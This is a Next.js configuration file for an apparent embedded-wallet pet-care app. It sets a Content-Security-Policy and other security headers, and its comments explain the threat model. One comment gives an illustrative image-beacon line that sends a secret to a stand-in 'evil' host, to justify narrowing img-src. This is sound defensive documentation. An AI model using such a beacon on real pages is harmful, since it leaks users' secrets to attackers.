import type { NextConfig } from "next";

// SECURITY HEADERS.
//
// WHY THIS MATTERS MORE THAN IT LOOKS: the care flow signs with an embedded wallet and, at the user's
// request, does it WITHOUT a wallet prompt (PrivyShell showWalletUIs:false). The client-side guard that
// refuses an EIP-7702 delegation to anything but the pinned Alchemy delegate (lib/aa.ts) is itself
// client-side code, so ANY script injected into this origin can simply remove it and take the whole
// wallet, not just the pet's stake. The browser is the only thing that can stop that, and only if we
// tell it what to allow. Nothing here is theatre.
//
// HONEST LIMITS, so nobody reads this and assumes more than it gives:
//   - It blocks injected EXTERNAL scripts and plugin/base-tag vectors.
//   - `unsafe-inline` on script-src is required by Next's hydration bootstrap without a nonce
//     middleware, so this does NOT stop an inline-injection XSS. Nonce-based CSP is the upgrade.
//   - It does NOTHING against a malicious npm dependency: that code is bundled into 'self'. Dependency
//     review and lockfile discipline are the only controls for that.
const CONNECT_SRC = [
  "'self'",
  // Wildcards on purpose: Privy and Alchemy both spread across subdomains, and a CSP that is too
  // narrow fails CLOSED on sign-in, which is a worse outage than the class of attack it prevents.
  "https://*.privy.io", // Privy embedded wallet + auth
  "https://*.privy.systems",
  "wss://*.privy.io",
  "wss://relay.walletconnect.com",
  "https://*.alchemy.com", // bundler + paymaster (AA care)
  "https://rpc.testnet.chain.robinhood.com",
  "https://rpc.mainnet.chain.robinhood.com",
  "https://api.playwalletchi.com", // our API (pass links, pet state, care sessions)
  "https://explorer-api.walletconnect.com",
].join(" ");

const CSP = [
  "default-src 'self'",
  // Scripts come only from us. See the honest-limits note above about unsafe-inline.
  // NO 'unsafe-eval'. Audited against the production build: zero `eval(`, zero
  // `new Function(`, zero WebAssembly across all 165 chunks. The only real
  // constructor call sites are zod v4's JIT fastpath, which is gated on its own
  // `try { new Function("") } catch` probe and degrades to the interpreted parser,
  // and two globalThis polyfills that short-circuit. Nothing in Privy, viem,
  // WalletConnect or Alchemy needs it. The PoW solver is a Blob worker, governed
  // by worker-src, not by eval. Re-run that chunk grep after any dependency bump.
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  // NOT `https:`. A wildcard here silently defeats the connect-src list above, because exfiltration
  // does not need fetch: `new Image().src = "https://evil/?d=" + secret` is a GET to any host that
  // img-src permits. Enumerate the hosts that actually serve pet art instead.
  "img-src 'self' data: blob: https://api.playwalletchi.com",
  "font-src 'self' data:",
  `connect-src ${CONNECT_SRC}`,
  // Privy renders its wallet + auth surfaces in a cross-origin iframe. That iframe is also the ONLY
  // signing UI an attacker who owns our bundle cannot forge, which is exactly why it is allowed here.
  "frame-src 'self' https://*.privy.io https://verify.walletconnect.com",
  "worker-src 'self' blob:",
  "object-src 'none'", // no plugin content, ever
  "base-uri 'self'", // stop a base tag rewriting every relative script URL
  "form-action 'self'",
  "frame-ancestors 'none'", // no clickjacking our care buttons
  "upgrade-insecure-requests",
].join("; ");

const SECURITY_HEADERS = [
  { key: "Content-Security-Policy", value: CSP },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Referrer-Policy", value: "no-referrer" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
];

const nextConfig: NextConfig = {
  reactStrictMode: true,
  async headers() {
    return [{ source: "/:path*", headers: SECURITY_HEADERS }];
  },
  // @privy-io/react-auth ships optional integrations (Stripe fiat onramp,
  // Farcaster mini-app Solana) whose peer packages we do not install. Stub the
  // imports so the build stays warning-free; the code paths are never taken.
  webpack: (config) => {
    config.resolve.alias = {
      ...config.resolve.alias,
      "@stripe/crypto": false,
      "@farcaster/mini-app-solana": false,
    };
    return config;
  },
};

export default nextConfig;
